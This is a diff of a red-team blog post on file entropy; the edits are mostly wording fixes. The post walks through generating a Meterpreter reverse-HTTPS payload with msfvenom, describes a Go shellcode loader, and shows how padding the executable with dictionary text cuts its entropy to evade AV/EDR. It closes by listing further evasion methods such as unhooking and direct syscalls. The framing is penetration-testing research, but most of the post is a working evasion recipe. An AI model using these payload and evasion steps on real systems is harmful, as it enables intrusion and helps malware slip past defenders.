@@ -24,10 +24,10 @@
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Entropy Analysis"/>
-<meta name="twitter:description" content="While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but one that caught my eye mentioned file entropy. I have looked the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads."/>
+<meta name="twitter:description" content="While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but one that caught my eye mentioned file entropy. I have looked at the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads."/>
 
 <meta property="og:title" content="Entropy Analysis" />
-<meta property="og:description" content="While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but one that caught my eye mentioned file entropy. I have looked the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads." />
+<meta property="og:description" content="While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but one that caught my eye mentioned file entropy. I have looked at the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/entropy/" />
 <meta property="article:published_time" content="2022-07-17T00:00:00+00:00" />
@@ -220,12 +220,12 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
   
   
   <div class="post">
-    <p>While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but <a href="https://vanmieghem.io/blueprint-for-evading-edr-in-2022/">one that caught my eye</a> mentioned file entropy. I have looked the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads.</p>
-<p>In this article, I will start by describing what entropy is and then go into different ways you can reduce the entropy score. Reducing the score will not automatically make the payload bypass security tools, but it may be one of the attributes that is examined.</p>
+    <p>While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but <a href="https://vanmieghem.io/blueprint-for-evading-edr-in-2022/">one that caught my eye</a> mentioned file entropy. I have looked at the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads.</p>
+<p>In this article, I will start by describing what entropy is and then go into different ways you can reduce the entropy score. Reducing the payload entropy will not automatically bypass security tools, but it may be one of the attributes that is examined.</p>
 <h2 id="what-is-entropy">What is Entropy</h2>
-<p>According to <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)">Wikipedia</a>, the entropy is &ldquo;&hellip;the average level of &lsquo;information&rsquo;, &lsquo;surprise&rsquo;, or &lsquo;uncertainty&rsquo; inherent to the variable&rsquo;s possible outcomes&rdquo;. In other words, entropy is a measure of randomness of data in the specified file. In security, most people refer to Shannon Entropy which is a specific algorithm that returns a value between 0 and 8. The higher the number, the more random the data is. Many times, a higher value represents that the data is either packed or encrypted.</p>
-<p>Different security products may calculate the entropy of a file in order to help determine if it is malicious or not. One article I found useful when researching entropy was from <a href="https://practicalsecurityanalytics.com/file-entropy/">Practical Security Analytics</a>. In the article, they analyzed the entropy of around 500k Windows executable files to determine how effective entropy analysis is when distiguishing malicious from legitimate files. One of the main data points that stood out was that files with an entropy above 7.2 tended to be malicious.</p>
-<p>There are a few additional references at the end of the blog post that can provide more details about entropy and the use in malware analysis.</p>
+<p>According to <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)">Wikipedia</a>, entropy is &ldquo;&hellip;the average level of &lsquo;information&rsquo;, &lsquo;surprise&rsquo;, or &lsquo;uncertainty&rsquo; inherent to the variable&rsquo;s possible outcomes.&rdquo; In other words, entropy is a measure of randomness of data in the specified file. In security, most people use Shannon Entropy, which is a specific algorithm that returns a value between 0 and 8. The higher the number, the more random the data. Many times, a higher value means that the data is either packed or encrypted.</p>
+<p>Different security products may calculate the entropy of a file in order to help determine if it is malicious or not. One article I found useful when researching entropy was from <a href="https://practicalsecurityanalytics.com/file-entropy/">Practical Security Analytics</a>. In the article, they analyzed the entropy of around 500k Windows executable files. The purpose was to determine how effective entropy analysis is when distiguishing malicious files from legitimate files. One of the main data points that stood out, files with an entropy above 7.2 tended to be malicious.</p>
+<p>There are a few additional references at the end of the blog post that can provide more details about entropy and it&rsquo;s use in malware analysis.</p>
 <h2 id="checking-entropy">Checking Entropy</h2>
 <p>On Linux and Mac machines, the &ldquo;ent&rdquo; program can be used to check the entropy of a file. As you can see from the output below, &ldquo;bash&rdquo; has an entropy of around 6.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ent /bin/bash
@@ -244,7 +244,7 @@ Serial correlation coefficient is 0.409743 <span style="color:#f92672">(</span>t
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file /bin/bash
 6.159560931054298
 </code></pre></div><h2 id="basic-payload">Basic Payload</h2>
-<p>I wanted to check the entropy of different malware samples and see if there was a way I could get it as low as possible. The simplest and quickest method was to generate a stageless Metasploit executable using the command below.</p>
+<p>Next, I wanted to check the entropy of different malware samples and see if there was a way I could get it as low as possible. The simplest and quickest method was to generate a stageless Metasploit executable using the command below.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -e x86/shikata_ga_nai -f exe -o msf.exe
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
@@ -255,10 +255,10 @@ x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">201849</sp
 Payload size: <span style="color:#ae81ff">201849</span> bytes
 Final size of exe file: <span style="color:#ae81ff">208384</span> bytes
 Saved as: msf.exe
-</code></pre></div><p>The entropy is almost the highest possible, and would definately be flagged by security scanners.</p>
+</code></pre></div><p>The entropy is almost at the highest possible number, and would definately be flagged by security scanners.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file msf.exe
 7.924424214044725
-</code></pre></div><p>I then decided to use Metasploit to generate shellcode instead of an executable. I could then create my own loader that would inject and execute the shellcode.</p>
+</code></pre></div><p>I then decided to use Metasploit to generate shellcode instead of an executable. In doing this, I could then create my own loader that would inject and execute the shellcode.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -e x86/shikata_ga_nai -f raw -o payload.bin
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
@@ -271,7 +271,7 @@ Saved as: payload.bin
 </code></pre></div><p>The shellcode entropy was even higher than the executable.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file payload.bin 
 7.986056713327999
-</code></pre></div><p>Next, I created a loader in Go that was then compiled to a Windows executable in order to execute the shellcode. I used Go&rsquo;s &ldquo;embed&rdquo; library to easily add the shellcode to the file. The code below uses different Windows API calls in order to allocate memory, copy the shellcode to the allocated memory, change the memory permissions, and then execute the shellcode.</p>
+</code></pre></div><p>Then, I created a loader in Go that was compiled to a Windows executable in order to execute the shellcode. I used Go&rsquo;s &ldquo;embed&rdquo; library to easily add the shellcode to the file. The code below uses different Windows API calls in order to allocate memory, copy the shellcode to the allocated memory, change the memory permissions, and lastly execute the shellcode.</p>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -378,7 +378,7 @@ $ GOOS<span style="color:#f92672">=</span>windows GOARCH<span style="color:#f926
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file payload.exe
 7.015162704411349
 </code></pre></div><h2 id="reducing-entropy">Reducing Entropy</h2>
-<p>Even though the entropy dropped, I still wanted to try to get it lower. Since entropy is based on randomness, one way to reduce the score was to add nomral text to the file. This was done by downloading the english dictionary and embedding it into the paylaod. The commands below show how I downloaded the dictionary, unzip the file, and then print out the number of words in the file.</p>
+<p>Even though the entropy dropped, I still wanted to try to get it lower. Since entropy is based on randomness, one way to reduce the score was to add nomral text to the file. This was done by downloading the english dictionary and embedding it into the payloadd. The commands below show how I downloaded the dictionary and displayed the number of words in the file.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget http://www.gwicks.net/textlists/english3.zip
 $ unzip english3.zip
 $ ls -alh english3.txt 
@@ -407,7 +407,7 @@ $ wc -l english3.txt
 
 $ ./shannon -file payload3.exe
 6.029571138204901
-</code></pre></div><p>I did another test to try to drop the entropy one more time. I included more text to the file by copying the english dictionary multiple times.</p>
+</code></pre></div><p>I did another test to try to drop the entropy one more time by copying the english dictionary multiple times.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat english3.txt english3.txt english3.txt english3.txt english3.txt &gt; englishbig.txt
 
 $ ls -alh englishbig.txt 
@@ -419,13 +419,13 @@ $ wc -l englishbig.txt
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file payload4.exe
 5.0849956311902105
 </code></pre></div><h2 id="wrap-up">Wrap-Up</h2>
-<p>Besides the entropy dropping, the payload still executes and runs normally. I was able to drop the entropy almost three points (about 36%) by incorporating a few simple techniques that could be used by anyone.</p>
+<p>In conclusion, I was able to drop the entropy almost three points (about 36%) by incorporating a few simple techniques that could be used by anyone. It is also important to note that the payload still executes and runs normally.</p>
 <p>Reducing the entropy alone won&rsquo;t bypass AV/EDR tools, but it is one aspect of creating payloads that can be easily manipulated. It can be useful when combined with additional techniques like:</p>
 <ul>
-<li>Encrypting the shellcode and then decrypting before executing</li>
-<li>Adding delays or other functionality to the payload to make it seem more realistic</li>
+<li>Shellcode encription</li>
+<li>Delays and other normal functionality</li>
 <li>Unhooking</li>
-<li>Using direct syscalls</li>
+<li>Direct syscalls</li>
 </ul>
 <h2 id="references--acknowledgements">References / Acknowledgements</h2>
 <ul>
